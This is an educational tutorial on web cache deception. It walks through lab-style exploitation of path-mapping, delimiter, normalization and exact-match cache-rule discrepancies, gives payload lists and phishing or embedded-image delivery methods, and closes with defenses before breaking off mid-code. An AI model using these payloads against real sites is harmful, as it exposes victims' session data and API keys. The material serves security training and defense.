# Web Cache Deception

Web cache deception is a vulnerability that enables attackers to trick caching systems into storing sensitive, dynamically-generated content intended for specific users, then accessing that cached content to view private information. Unlike web cache poisoning which injects malicious content into cached responses served to multiple users, web cache deception exploits discrepancies between how cache servers and origin servers parse URLs to store legitimate but sensitive responses. The attack succeeds when a cache misinterprets an ambiguous URL as a request for static content while the origin server interprets it as a request for dynamic data—the attacker crafts a malicious URL, tricks a victim into visiting it causing their private data to be cached, then retrieves that cached response to access the victim's session information, personal details, API tokens, or other confidential data without authentication.

The core vulnerability: **cache and origin server disagree on URL interpretation**—what appears cacheable to one system is actually sensitive data from another.

## What is web cache deception?

### Understanding web caches

**Web cache purpose:**
```
Client → Cache Server → Origin Server → Database

With cache:
1. Client requests resource
2. Cache checks if it has a stored copy
3. If cache hit: Return cached response (fast)
4. If cache miss: Forward to origin server
5. Origin server generates response
6. Cache stores copy (based on rules)
7. Response sent to client

Benefit: Reduced latency, lower server load
```

**Cached vs. non-cached requests:**

**Static resource (cached):**
```http
Request 1:
GET /assets/style.css HTTP/1.1
Host: example.com

Cache miss → Forward to origin → Response cached
Response time: 200ms

Request 2 (same resource):
GET /assets/style.css HTTP/1.1

Cache hit → Served from cache
Response time: 5ms
```

**Dynamic resource (not cached):**
```http
GET /api/user/profile HTTP/1.1
Authorization: Bearer user_token

Always forwarded to origin server
Response contains user-specific data
Response time: 200ms every time
```

### Web cache deception vs. web cache poisoning

| Aspect | Web Cache Deception | Web Cache Poisoning |
|--------|---------------------|---------------------|
| **Goal** | Steal victim's private data | Inject malicious content for others |
| **Target** | Specific victim's session | All users of cached resource |
| **Technique** | URL manipulation to cache dynamic content | Cache key manipulation to inject payload |
| **Victim action** | Visit attacker's crafted URL | Request poisoned cached resource |
| **Attacker gains** | Victim's cached private data | Ability to execute XSS/redirect on victims |
| **Cache stores** | Legitimate sensitive content | Malicious modified content |

**Web cache deception example:**
```http
Attacker crafts URL: /user/profile/wcd.css
Victim visits URL
Origin returns: {"username":"victim","ssn":"123-45-6789"}
Cache stores response (thinks it's CSS file)
Attacker requests: /user/profile/wcd.css
Attacker receives: Victim's cached profile data!
```

**Web cache poisoning example:**
```http
Attacker sends: GET /resources/js/tracking.js
               X-Forwarded-Host: attacker.com

Response includes: <script src="//attacker.com/evil.js">
Cache stores poisoned response
Other users request: /resources/js/tracking.js
Users receive: Poisoned response with attacker's script
```

### How cache keys work

**Cache key components:**

**Typical cache key:**
```
URL Path: /api/products/123
Query Parameters: ?category=electronics&sort=price
(Sometimes) Headers: Accept-Language, User-Agent

Cache Key = Hash(path + query + headers)

Same cache key → Cache hit (serve cached response)
Different cache key → Cache miss (forward to origin)
```

**Example:**
```http
Request 1:
GET /products?id=1 HTTP/1.1
Cache Key: hash("/products?id=1")
Response: Product 1 details → Cached

Request 2 (same cache key):
GET /products?id=1 HTTP/1.1
Cache Key: hash("/products?id=1")
Result: Cache hit → Served from cache

Request 3 (different cache key):
GET /products?id=2 HTTP/1.1
Cache Key: hash("/products?id=2")
Result: Cache miss → Forward to origin
```

**Important for testing:**
```
Always use unique cache keys during testing
Add cache buster: ?cachebuster=12345
Change value each request: ?cachebuster=12346
Prevents serving cached responses during tests
```

### Cache rules

**Common cache rule types:**

**Rule 1: Static file extension**
```
Cache if path ends with:
.css, .js, .jpg, .png, .gif, .ico, .woff, .ttf

Examples:
/assets/style.css → Cache
/js/app.js → Cache
/images/logo.png → Cache
/api/user/profile → Don't cache
```

**Rule 2: Static directory**
```
Cache if path starts with:
/static/, /assets/, /public/, /resources/

Examples:
/static/css/style.css → Cache
/assets/images/logo.png → Cache
/api/users → Don't cache
```

**Rule 3: Specific file names**
```
Cache these files:
robots.txt, favicon.ico, sitemap.xml, index.html

Examples:
/robots.txt → Cache
/favicon.ico → Cache
/profile.html → Don't cache (not exact match)
```

**Rule 4: Cache-Control header**
```http
Response with:
Cache-Control: public, max-age=3600

Cache stores for 1 hour

Response with:
Cache-Control: private, no-store

Don't cache (dynamic content)
```

### Detecting cached responses

**Method 1: X-Cache header**
```http
GET /assets/style.css HTTP/1.1

Response 1:
X-Cache: miss
Response time: 150ms
(Cache didn't have copy, fetched from origin)

Response 2 (same request):
X-Cache: hit
Response time: 8ms
(Served from cache)

Other values:
X-Cache: dynamic → Origin generated dynamically, not cached
X-Cache: refresh → Cache refreshed content
```

**Method 2: Response timing**
```
First request: 200ms (origin server)
Second request: 10ms (cache hit)

Significant time difference → Likely cached
```

**Method 3: Cache-Control header in response**
```http
Cache-Control: public, max-age=86400
→ Suggests cacheable (24 hours)

Cache-Control: private, no-store
→ Should not be cached
```

**Method 4: Age header**
```http
Age: 300

Response has been in cache for 300 seconds
Indicates cached response
```

## Exploiting static extension cache rules

### Understanding path mapping discrepancies

**Traditional URL mapping (file system):**
```
URL: http://example.com/static/css/style.css

Mapping:
/static/css/style.css
│       │   │
│       │   └─ File: style.css
│       └─ Directory: css/
└─ Directory: static/

Server looks for physical file at:
/var/www/html/static/css/style.css
```

**REST-style URL mapping (logical endpoints):**
```
URL: http://example.com/api/users/123/profile

Mapping:
/api/users/123/profile
│   │     │   │
│   │     │   └─ Endpoint: profile
│   │     └─ Parameter: user ID = 123
│   └─ Resource: users
└─ API prefix

No physical file, routes to function:
getUserProfile(userId: 123)
```

### Vulnerability: Different interpretations

**Exploitable scenario:**

**Vulnerable URL:**
```
http://example.com/user/123/profile/malicious.css
```

**Origin server (REST-style):**
```
Parses: /user/123/profile/malicious.css

Routes to endpoint: /user/123/profile
Treats malicious.css as: Non-significant parameter (ignored)

Returns: User 123's profile information
{
    "username": "victim",
    "email": "victim@example.com",
    "ssn": "123-45-6789",
    "apiKey": "sk_live_abc123..."
}
```

**Cache server (traditional mapping):**
```
Parses: /user/123/profile/malicious.css

Interprets as:
Directory: /user/123/profile/
File: malicious.css

Cache rule: Store responses for *.css files
Decision: Cache this response

Stores: User 123's profile as if it were a CSS file
```

**Attack result:**
```
Attacker sends victim: http://example.com/user/123/profile/wcd.css
Victim's browser requests URL
Origin returns profile data
Cache stores response (thinks it's CSS)
Attacker requests same URL
Attacker receives: Cached victim profile!
```

### Testing for path mapping discrepancies

**Step 1: Test origin server path abstraction**

**Baseline request:**
```http
GET /api/orders/123 HTTP/1.1
Authorization: Bearer <victim_token>

Response: Order details for order 123
```

**Test with arbitrary path segment:**
```http
GET /api/orders/123/arbitrary HTTP/1.1
Authorization: Bearer <victim_token>

If response still shows order 123 details:
→ Origin server abstracts path, ignores "arbitrary"
→ Uses REST-style routing
→ Potentially vulnerable!

If response shows 404 error:
→ Origin server uses traditional mapping
→ Looks for physical file at /api/orders/123/arbitrary
→ Not vulnerable to this technique
```

**Step 2: Test cache interpretation**

**Add static extension:**
```http
GET /api/orders/123/arbitrary.js HTTP/1.1
Authorization: Bearer <victim_token>

Check response headers for caching indicators:
X-Cache: miss (first request)
X-Cache: hit (second request)

If cached:
→ Cache interprets full path with .js extension
→ Cache has rule to store *.js files
→ Vulnerability confirmed!

If not cached:
→ Try different extensions: .css, .ico, .png, .gif
```

**Step 3: Test multiple extensions**

```
Test payload patterns:
/api/orders/123/test.css
/api/orders/123/test.js
/api/orders/123/test.ico
/api/orders/123/test.jpg
/api/orders/123/test.png
/api/orders/123/test.gif
/api/orders/123/test.woff
/api/orders/123/test.svg
/api/orders/123/test.ttf
/api/orders/123/test.exe

Look for X-Cache: hit on subsequent requests
```

#### Lab: Exploiting path mapping for web cache deception

**Scenario:** E-commerce application with vulnerable caching.

**Step 1: Identify target endpoint**
```http
GET /my-account HTTP/1.1
Cookie: session=victim_session

Response:
{
    "username": "victim",
    "email": "victim@example.com",
    "apiKey": "secret_key_123"
}

This contains sensitive data → Target endpoint
```

**Step 2: Test path abstraction**
```http
GET /my-account/test HTTP/1.1
Cookie: session=victim_session

If response still shows account details:
→ Origin server ignores "test" parameter
```

**Step 3: Test static extension caching**
```http
GET /my-account/wcd.js HTTP/1.1
Cookie: session=victim_session

Response:
{
    "username": "victim",
    "email": "victim@example.com",
    "apiKey": "secret_key_123"
}
X-Cache: miss

Second request:
X-Cache: hit
→ Response is cached!
```

**Step 4: Craft exploit URL**
```
Malicious URL: https://example.com/my-account/exploit.js

Send to victim via:
- Email phishing
- Social media message
- Malicious website redirect
```

**Step 5: Retrieve cached data**
```http
GET /my-account/exploit.js HTTP/1.1

Response:
{
    "username": "victim",
    "email": "victim@example.com",
    "apiKey": "secret_key_123"
}
X-Cache: hit

Attacker now has victim's API key!
Lab solved!
```

### Using cache busters during testing

**Why cache busters are critical:**
```
Without cache buster:
Request 1: /api/profile/test.css → Your data cached
Request 2: /api/profile/test.css → Your cached data returned
Test result: Inconclusive (can't tell if vulnerable)

With cache buster:
Request 1: /api/profile/test.css?cb=1 → Your data cached at key 1
Request 2: /api/profile/test.css?cb=2 → New request, different key
Test result: Clear (can see actual server behavior)
```

**Manual cache busting:**
```http
GET /api/profile/test.css?buster=1 HTTP/1.1
GET /api/profile/test.css?buster=2 HTTP/1.1
GET /api/profile/test.css?buster=3 HTTP/1.1

Each request has unique cache key
Prevents cached responses affecting tests
```

**Automated with Param Miner:**
```
Burp extension: Param Miner
1. Install from BApp Store
2. Param Miner → Settings → Add dynamic cachebuster
3. Automatically adds unique query string to each request
4. Example: ?cachebuster=1708292834123

View in Logger tab to verify
```

## Exploiting delimiter discrepancies

### Understanding delimiter usage

**Standard delimiters:**
```
? → Separates path from query string
  Example: /page?param=value

# → Fragment identifier (not sent to server)
  Example: /page#section

& → Separates query parameters
  Example: /page?param1=value1&param2=value2
```

**Framework-specific delimiters:**

**Java Spring (semicolon for matrix variables):**
```java
@GetMapping("/user/{id}")
public User getUser(@PathVariable String id, @MatrixVariable String filter) {
    // Semicolon separates matrix variables
}

Request: /user/123;filter=active;sort=asc
Parsed as:
- Path: /user/123
- Matrix variables: filter=active, sort=asc
```

**Ruby on Rails (period for format):**
```ruby
# Routes
get '/profile', to: 'users#profile'

# Requests
/profile      → Default HTML format
/profile.json → JSON format
/profile.xml  → XML format

Period (.) specifies response format
```

### Delimiter discrepancy exploitation

**Vulnerable scenario:**

**Java Spring origin server:**
```
Request: /profile;wcd.css

Parsing:
- Path: /profile
- Matrix variable: wcd.css (ignored if not expected)

Returns: Profile information
```

**Cache server (non-Java):**
```
Request: /profile;wcd.css

Parsing:
- Full path: /profile;wcd.css
- Semicolon not recognized as delimiter
- Path ends with .css

Cache rule: Store *.css responses
Decision: Cache response
```

**Result:**
```
Origin: Returns dynamic profile data
Cache: Stores as static CSS file
Attacker: Can retrieve cached profile
```

### Testing for delimiter discrepancies

**Step 1: Establish baseline**

**Normal request:**
```http
GET /settings/users/list HTTP/1.1
Authorization: Bearer <token>

Response: List of users
```

**Request with arbitrary string:**
```http
GET /settings/users/listaaa HTTP/1.1
Authorization: Bearer <token>

Response: 404 Not Found or different error

This becomes reference response
```

**Step 2: Test delimiter characters**

**Test semicolon:**
```http
GET /settings/users/list;aaa HTTP/1.1

Compare response:

If identical to /settings/users/list:
→ Semicolon is a delimiter
→ Origin server truncates at ;
→ Interprets path as /settings/users/list

If identical to /settings/users/listaaa:
→ Semicolon is NOT a delimiter
→ Origin server reads full path
→ Interprets as /settings/users/list;aaa
```

**Step 3: Test delimiter characters systematically**

**Common delimiters to test:**
```
; (semicolon) - Java Spring matrix variables
. (period) - Ruby on Rails format specifier
# (hash) - Fragment identifier
? (question) - Query string separator
, (comma) - Various frameworks
\ (backslash) - Some Windows paths
%00 (null byte) - OpenLiteSpeed delimiter
%0A (newline) - Some parsers
%09 (tab) - Some parsers
%20 (space) - URL encoding
```

**Testing template:**
```http
GET /settings/users/list[DELIMITER]aaa HTTP/1.1

Delimiters to test systematically:
/settings/users/list;aaa
/settings/users/list.aaa
/settings/users/list,aaa
/settings/users/list:aaa
/settings/users/list%00aaa
/settings/users/list%0Aaaa
```

**Step 4: Test if cache uses same delimiter**

**Add static extension after delimiter:**
```http
GET /settings/users/list;aaa.js HTTP/1.1

If semicolon is delimiter for origin but not cache:

Origin interprets: /settings/users/list
Cache interprets: /settings/users/list;aaa.js

Check X-Cache header:
First request: X-Cache: miss
Second request: X-Cache: hit

If cached → Vulnerability confirmed!
```

#### Lab: Exploiting path delimiters for web cache deception

**Scenario:** Application uses Java Spring (semicolon delimiter).

**Step 1: Identify sensitive endpoint**
```http
GET /my-account HTTP/1.1
Cookie: session=abc123

Response:
{
    "username": "carlos",
    "email": "carlos@example.com",
    "role": "user"
}
```

**Step 2: Test delimiter**
```http
GET /my-account;test HTTP/1.1

Response still shows account data
→ Semicolon is delimiter for origin server
```

**Step 3: Add static extension**
```http
GET /my-account;test.css HTTP/1.1
Cookie: session=abc123

Response:
{
    "username": "carlos",
    "email": "carlos@example.com"
}
X-Cache: miss

Second request:
X-Cache: hit
→ Cached!
```

**Step 4: Craft victim URL**
```
URL: https://example.com/my-account;wcd.css

Origin sees: /my-account
Cache sees: /my-account;wcd.css

Send URL to victim
```

**Step 5: Retrieve cached victim data**
```http
GET /my-account;wcd.css HTTP/1.1
(No authentication needed)

Response:
{
    "username": "victim",
    "email": "victim@example.com",
    "apiKey": "victim_secret_key"
}
X-Cache: hit

Lab solved!
```

### Delimiter decoding discrepancies

**URL encoding review:**
```
Character → Encoded
# → %23
? → %3f
; → %3b
/ → %2f
\ → %5c
Space → %20
Null → %00
```

**Decoding discrepancy scenario:**

**Request:** `/profile%23wcd.css`

**Origin server (decodes %23 to #):**
```
URL-decoded: /profile#wcd.css
Uses # as delimiter
Interprets path: /profile
Returns: Profile information
```

**Cache server (doesn't decode %23):**
```
Path: /profile%23wcd.css
No decoding of %23
Ends with .css → Matches cache rule
Stores response as CSS file
```

**Testing encoded delimiters:**

**Test encoded hash:**
```http
GET /profile%23test HTTP/1.1

If origin returns profile:
→ Origin decodes %23 to #
→ Uses # as delimiter

GET /profile%23wcd.css HTTP/1.1

If cached:
→ Cache doesn't decode %23
→ Sees full path ending in .css
→ Stores response
```

**Test multiple encoded delimiters:**
```
%23 (hash)
%3f (question mark)
%3b (semicolon)
%00 (null byte - often truncates)
%0A (newline)
%09 (tab)
%2e (period)

Example payloads:
/profile%23wcd.css
/profile%3fwcd.css
/profile%3bwcd.css
/profile%00wcd.css
/profile%0Awcd.css
```

### Automated delimiter testing with Burp Intruder

**Setup:**
```http
GET /my-account§§test.css HTTP/1.1
Cookie: session=abc123

Position marker before "test"
```

**Payload configuration:**
```
Payload type: Simple list

Payloads:
;
.
:
,
%00
%0A
%09
%23
%3f
%3b
%2e

Intruder settings:
☑ Add payload markers around payload
☐ URL-encode these characters (important: keep OFF)
```

**Attack and analyze:**
```
Filter by:
- Status code: 200
- X-Cache: hit (in second request)
- Response length (similar to target endpoint)

Successful payload example:
GET /my-account;test.css
X-Cache: hit

→ Semicolon delimiter exploitation confirmed
```

## Exploiting static directory cache rules

### Understanding static directory patterns

**Common static directory prefixes:**
```
/static/
/assets/
/public/
/resources/
/cdn/
/content/
/media/
/files/
/images/
/js/
/css/
/dist/
/build/
```

**Static directory cache rule:**
```
If path starts with /static/:
    Cache response
    
Examples:
/static/css/style.css → Cache
/static/js/app.js → Cache
/static/images/logo.png → Cache
/api/user/profile → Don't cache
```

### Path traversal basics

**Path traversal sequences:**
```
.. → Up one directory level

Examples:
/static/css/../../profile
    /static/css/ (start)
    /static/ (.. goes up to /static)
    / (.. goes up to /)
    /profile (final path)

Normalized: /profile
```

**URL encoding requirement:**
```
Browser behavior:
/static/../profile
Browser resolves: /profile (before sending request)

Server never sees: /static/../profile
Server receives: /profile

Solution: Encode slashes
/static/..%2fprofile
Browser doesn't resolve (encoded)
Sent to server as-is
```

### Normalization discrepancies

**Normalization process:**
```
Original: /static/..%2f..%2fprofile

Decoding: /static/../../profile

Resolving dot-segments:
1. Start: /static/
2. Process ..: /
3. Process ..: /
4. Append profile: /profile

Normalized: /profile
```

**Discrepancy exploitation:**

**Scenario: Origin normalizes, cache doesn't**

**Request:** `/static/..%2fprofile`

**Origin server:**
```
1. Decodes %2f to /: /static/../profile
2. Resolves ..: /profile
3. Returns: User profile data
```

**Cache server:**
```
1. Doesn't decode or resolve
2. Path: /static/..%2fprofile
3. Starts with /static/ → Matches cache rule
4. Stores response
```

### Testing for normalization by origin server

**Step 1: Choose non-cacheable endpoint**
```http
POST /profile HTTP/1.1

POST method is non-cacheable
Use as baseline
```

**Step 2: Add path traversal with arbitrary directory**
```http
POST /aaa/..%2fprofile HTTP/1.1

If response matches baseline (/profile):
→ Origin decodes %2f and resolves ..
→ Normalizes to /profile

If response is 404 error:
→ Origin doesn't normalize
→ Interprets as /aaa/..%2fprofile (literal)
```

**Step 3: Test encoding variations**
```
Encode just the second slash:
/aaa/..%2fprofile

Encode the entire sequence:
/aaa/%2e%2e%2fprofile

Encode a dot instead:
/aaa/.%2e/profile

Test which encoding is normalized by origin
```

### Testing for normalization by cache server

**Step 1: Identify static directory**

**Review Burp HTTP history:**
```
Filter for:
- Status: 2xx
- MIME type: script, images, CSS
- Look for common prefixes: /static/, /assets/

Example findings:
GET /assets/js/app.js → X-Cache: hit
GET /static/css/style.css → X-Cache: hit
```

**Step 2: Test path traversal before static directory**
```http
GET /aaa/..%2fassets/js/app.js HTTP/1.1

If no longer cached (X-Cache: miss):
→ Cache doesn't normalize
→ Interprets as /aaa/..%2fassets/js/app.js
→ Doesn't match /assets/ prefix

If still cached (X-Cache: hit):
→ Cache normalizes to /assets/js/app.js
```

**Step 3: Test path traversal after directory prefix**
```http
GET /assets/..%2fjs/app.js HTTP/1.1

If no longer cached:
→ Cache decodes and resolves
→ Normalizes to /js/app.js
→ Doesn't match /assets/ prefix

If still cached:
→ Cache doesn't decode/resolve
→ Interprets as /assets/..%2fjs/app.js
→ Matches /assets/ prefix
```

**Step 4: Confirm static directory rule**
```http
GET /assets/random-file-xyz.abc HTTP/1.1

If still cached:
→ Confirms cache rule based on /assets/ prefix
→ Not just specific file extensions

If not cached (404):
→ May be extension-based caching
```

### Exploiting origin server normalization

**Exploit structure:**
```
/<static-directory-prefix>/..%2f<dynamic-path>

Example:
/static/..%2fprofile
```

**Attack flow:**

**Request:** `/assets/..%2fmy-account`

**Cache interpretation:**
```
Path: /assets/..%2fmy-account
Starts with /assets/ → Matches cache rule
Decision: Will cache if stored
```

**Origin interpretation:**
```
1. Decodes: /assets/../my-account
2. Resolves ..: /my-account
3. Returns: Account information
```

**Result:**
```
Origin: Returns dynamic account data
Cache: Stores as static /assets/ resource
Exploit: /assets/..%2fmy-account
```

#### Lab: Exploiting origin server normalization for web cache deception

**Scenario:** Origin normalizes paths, cache doesn't.

**Step 1: Identify target endpoint**
```http
GET /my-account HTTP/1.1
Cookie: session=user_session

Response:
{
    "username": "wiener",
    "email": "wiener@example.com"
}
```

**Step 2: Test origin normalization**
```http
POST /test/..%2fmy-account HTTP/1.1

Response: Account data (origin normalizes)
```

**Step 3: Identify static directory**
```
Burp HTTP history shows:
GET /resources/js/app.js → X-Cache: hit
```

**Step 4: Craft exploit payload**
```http
GET /resources/..%2fmy-account HTTP/1.1
Cookie: session=victim_session

Cache sees: /resources/..%2fmy-account (cacheable)
Origin sees: /my-account (normalized)

Response:
{
    "username": "carlos",
    "email": "carlos@example.com"
}
X-Cache: miss (first request)
X-Cache: hit (second request)
```

**Step 5: Send to victim and retrieve data**
```
Victim visits: /resources/..%2fmy-account

Attacker requests:
GET /resources/..%2fmy-account HTTP/1.1

Response: Victim's cached account data
Lab solved!
```

### Exploiting cache server normalization

**Exploit structure:**
```
/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>

Note: Encode entire traversal sequence

Example:
/profile%2f%2e%2e%2fstatic
```

**Challenge:** Path traversal alone isn't sufficient

**Insufficient payload:**
```
Request: /profile%2f%2e%2e%2fstatic

Cache:
1. Decodes: /profile/../static
2. Resolves: /static
3. Matches cache rule

Origin:
1. Doesn't decode/resolve
2. Path: /profile%2f%2e%2e%2fstatic
3. Returns: 404 error (path not found)

Problem: Origin doesn't return profile data!
```

**Solution: Combine with delimiter**

**Working payload:**
```
Request: /profile;%2f%2e%2e%2fstatic

Cache:
1. Doesn't use ; as delimiter
2. Decodes: /profile;/../static
3. Resolves: /static
4. Matches cache rule → Stores response

Origin:
1. Uses ; as delimiter
2. Truncates at: /profile
3. Returns: Profile data

Success: Profile data cached as /static resource!
```

**Complete testing process:**

**Step 1: Test cache normalization**
```http
GET /profile%2f%2e%2e%2fstatic HTTP/1.1

If X-Cache: hit on second request:
→ Cache normalizes path to /static
```

**Step 2: Test delimiter**
```http
GET /profile;test HTTP/1.1

If returns profile data:
→ Origin uses ; as delimiter
```

**Step 3: Combine both**
```http
GET /profile;%2f%2e%2e%2fstatic HTTP/1.1

Cache: Normalizes to /static (cached)
Origin: Truncates to /profile (returns data)

Result: Profile data stored in cache!
```

#### Lab: Exploiting cache server normalization for web cache deception

**Scenario:** Cache normalizes paths, origin uses semicolon delimiter.

**Step 1: Confirm cache normalization**
```http
GET /profile%2f%2e%2e%2fresources HTTP/1.1

X-Cache: hit (cache normalizes to /resources)
```

**Step 2: Confirm origin delimiter**
```http
GET /my-account;test HTTP/1.1

Response: Account data (semicolon is delimiter)
```

**Step 3: Craft exploit**
```http
GET /my-account;%2f%2e%2e%2fresources HTTP/1.1
Cookie: session=victim_session

Cache interprets:
1. Decodes: /my-account;/../resources
2. Resolves: /resources (cached)

Origin interprets:
1. Delimiter at ;: /my-account
2. Returns: Account data

Response cached!
```

**Step 4: Retrieve cached data**
```http
GET /my-account;%2f%2e%2e%2fresources HTTP/1.1

X-Cache: hit
Response: Victim's account data
Lab solved!
```

## Exploiting file name cache rules

### Understanding file name cache rules

**Common cached file names:**
```
robots.txt
favicon.ico
sitemap.xml
index.html
crossdomain.xml
.well-known/security.txt
```

**Exact match requirement:**
```
Cache rule: If filename == "robots.txt", cache response

/robots.txt → Match → Cache
/app/robots.txt → No match → Don't cache
/robots.txt.backup → No match → Don't cache

Rule requires exact string match
```

### Normalization exploitation for file name rules

**Only viable exploit: Cache normalizes, origin doesn't**

**Why other scenarios don't work:**

**If origin normalizes, cache doesn't:**
```
Request: /static/..%2frobots.txt

Origin: Normalizes to /robots.txt (returns robots.txt)
Cache: Sees /static/..%2frobots.txt (doesn't match "robots.txt")
Result: Not cached (doesn't match exact file name)
```

**Working exploit: Cache normalizes, origin doesn't**

**Payload structure:**
```
/<dynamic-path><delimiter>%2f%2e%2e%2f<filename>

Example:
/profile;%2f%2e%2e%2frobots.txt
```

**Attack flow:**

**Request:** `/profile;%2f%2e%2e%2frobots.txt`

**Cache server:**
```
1. Doesn't use ; as delimiter
2. Decodes: /profile;/../robots.txt
3. Resolves: /robots.txt
4. Exact match → Stores response
```

**Origin server:**
```
1. Uses ; as delimiter
2. Truncates: /profile
3. Returns: Profile data
```

**Result:**
```
Profile data cached as robots.txt file
Attacker retrieves from /profile;%2f%2e%2e%2frobots.txt
```

### Testing for file name cache rules

**Step 1: Identify cached file names**
```http
GET /robots.txt HTTP/1.1

X-Cache: hit

GET /favicon.ico HTTP/1.1

X-Cache: hit

Files cached: robots.txt, favicon.ico
```

**Step 2: Test cache normalization**
```http
GET /test%2f%2e%2e%2frobots.txt HTTP/1.1

If X-Cache: hit on second request:
→ Cache normalizes to /robots.txt
→ Matches exact file name rule
```

**Step 3: Test origin normalization**
```http
POST /test/..%2fprofile HTTP/1.1

If returns 404:
→ Origin doesn't normalize
→ Looks for literal path

If returns profile:
→ Origin normalizes (not exploitable for file name rules)
```

**Step 4: Test delimiter + normalization**
```http
GET /profile;%2f%2e%2e%2frobots.txt HTTP/1.1
Cookie: session=victim_session

Cache: Normalizes to /robots.txt (exact match)
Origin: Delimiter truncates to /profile

If X-Cache: hit:
→ Exploit confirmed
```

#### Lab: Exploiting exact-match cache rules for web cache deception

**Scenario:** Cache has exact-match rule for favicon.ico.

**Step 1: Identify cached file**
```http
GET /favicon.ico HTTP/1.1

X-Cache: hit
→ favicon.ico is cached
```

**Step 2: Test cache normalization**
```http
GET /test%2f%2e%2e%2ffavicon.ico HTTP/1.1

X-Cache: hit
→ Cache normalizes path to /favicon.ico
```

**Step 3: Find delimiter**
```http
GET /my-account;test HTTP/1.1

Response: Account data
→ Semicolon is delimiter for origin
```

**Step 4: Craft exploit**
```http
GET /my-account;%2f%2e%2e%2ffavicon.ico HTTP/1.1
Cookie: session=carlos

Cache: Normalizes to /favicon.ico (cached)
Origin: Truncates to /my-account (returns data)

X-Cache: miss (first request)

Second request:
X-Cache: hit
→ Cached!
```

**Step 5: Retrieve victim data**
```
Send victim to: /my-account;%2f%2e%2e%2ffavicon.ico

Attacker requests:
GET /my-account;%2f%2e%2e%2ffavicon.ico HTTP/1.1

Response: Victim's cached account data
Lab solved!
```

## Crafting effective exploits

### Exploit delivery methods

**Method 1: Social engineering**
```
Email phishing:
"Click here to view your statement: 
https://bank.com/statements;%2f%2e%2e%2fstatic/report.pdf"

Victim clicks → Their data cached
```

**Method 2: Embedded images**
```html
Attacker's website:
<img src="https://target.com/api/profile;wcd.css">

Victim visits attacker's site
Browser requests image
Victim's profile cached
```

**Method 3: Redirect chains**
```
Attacker's site redirects:
Location: https://target.com/account;%2f%2e%2e%2fassets/logo.png

Victim follows redirect
Account data cached
```

**Method 4: Open redirect abuse**
```
Target site has open redirect:
https://target.com/redirect?url=

Exploit:
https://target.com/redirect?url=https://target.com/profile;wcd.css

Victim clicks legitimate domain
Gets redirected to exploit URL
Profile cached
```

### Choosing target endpoints

**High-value targets:**

**User profiles:**
```http
GET /api/user/profile HTTP/1.1

Contains:
- Personal information
- Email addresses
- Phone numbers
- API keys
- Session tokens
```

**Account settings:**
```http
GET /settings HTTP/1.1

Contains:
- Security settings
- Two-factor recovery codes
- Connected accounts
- Billing information
```

**API responses:**
```http
GET /api/v1/me HTTP/1.1

Contains:
- Authentication tokens
- Refresh tokens
- User permissions
- Internal IDs
```

**OAuth/SAML responses:**
```http
GET /oauth/callback?code=AUTH_CODE HTTP/1.1

Contains:
- Authorization codes
- Access tokens
- ID tokens
```

**Admin panels:**
```http
GET /admin/dashboard HTTP/1.1

Contains:
- System information
- User lists
- Configuration details
- Sensitive metrics
```

### Maximizing exploit success

**Use GET requests when possible:**
```
GET requests more likely to be cached
POST/PUT/DELETE typically not cached

Best targets: GET endpoints with sensitive responses
```

**Avoid browser-side interference:**
```
Some applications:
- Redirect users without session
- Clear local storage on certain pages
- Validate session client-side

Testing: Use Burp Repeater instead of browser
Ensures clean cache behavior observation
```

**Test across different user roles:**
```
Test with:
- Regular user account
- Premium user account
- Admin account

Different roles may have different cache rules
```

## Prevention strategies

### Defense Layer 1: Cache-Control headers

**Mark dynamic content as non-cacheable:**

**Correct implementation:**
```javascript
// Node.js/Express
app.get('/api/user/profile', authenticate, (req, res) => {
    const profile = getUserProfile(req.user.id);
    
    // Prevent caching of dynamic content
    res.setHeader('Cache-Control', 'private, no-store, max-age=0');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    
    res.json(profile);
});
```

**PHP:**
```php
<?php
session_start();

// Dynamic user data
$profile = getUserProfile($_SESSION['user_id']);

// Prevent caching
header('Cache-Control: private, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

echo json_encode($profile);
?>
```

**Python (Flask):**
```python
from flask import Flask, jsonify, make_response

@app.route('/api/profile')
def profile():
    data = get_user_profile()
    
    response = make_response(jsonify(data))
    response.headers['Cache-Control'] = 'private, no-store, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    
    return response
```

**Cache-Control directives explained:**
```
private: Only client may cache, not shared caches
no-store: Must not store any part of request/response
no-cache: Must revalidate before using cached copy
max-age=0: Expires immediately
must-revalidate: Must check with origin when stale
```

**Apply to all dynamic endpoints:**
```javascript
// Middleware for all API routes
app.use('/api/*', (req, res, next) => {
    res.setHeader('Cache-Control', 'private, no-store, max-age=0');
    next();
});

// Static resources can still be cached
app.use('/static', express.static('public', {
    maxAge: 86400000 // 1 day
}));
```

### Defense Layer 2: CDN configuration

**Prevent cache rule override:**

**Configure CDN to respect Cache-Control:**
```
Cloudflare example:
1. Page Rules → Create Page Rule
2. URL pattern: example.com/api/*
3. Cache Level: Bypass

AWS CloudFront:
1. Behaviors → Create Behavior
2. Path Pattern: /api/*
3. Cache Policy: CachingDisabled

Result: CDN won't override origin Cache-Control headers
```

**Enable CDN protection features:**

**Cloudflare Cache Deception Armor:**
```
Dashboard → Caching → Configuration
Enable: "Cache Deception Armor"

How it works:
- Verifies response Content-Type matches URL extension
- If mismatch: Doesn't cache

Example:
Request: /profile.css
Response: Content-Type: application/json
Result: Not cached (Content-Type doesn't match .css)
```

**Akamai Content Protection:**
```
Property Configuration
Add Behavior: Advanced → Content Characteristics
Set: Verify Content-Type

Checks:
- URL ends with .css → Content-Type must be text/css
- URL ends with .js → Content-Type must be application/javascript
- Mismatch → Don't cache
```

**Custom CDN rules:**
```javascript
// Cloudflare Workers example
addEventListener('fetch', event => {
    event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
    const url = new URL(request.url);
    
    // Block suspicious patterns
    if (url.pathname.includes('..%2f') || 
        url.pathname.includes(';') ||
        url.pathname.match(/\/profile.*\.(css|js|ico)$/)) {
        return new Response('Blocked', { status: 403 });
    }
    
    // Normal processing
    return fetch(request);
}
```

### Defense Layer 3: URL path consistency

**Ensure consistent parsing:**

**Normalize paths before processing:**
```javascript
const path = require('path');

app.use((req, res, next) => {
    // Normalize URL path
    const normalized = path.normalize(req.path);
    
    // Check for path traversal attempts
    if (normalized !== req.path || normalized.includes('..')) {
        return res.status(400).json({ error: 'Invalid path' });
    }
    
    next();
});
```

**Reject ambiguous requests:**
```javascript
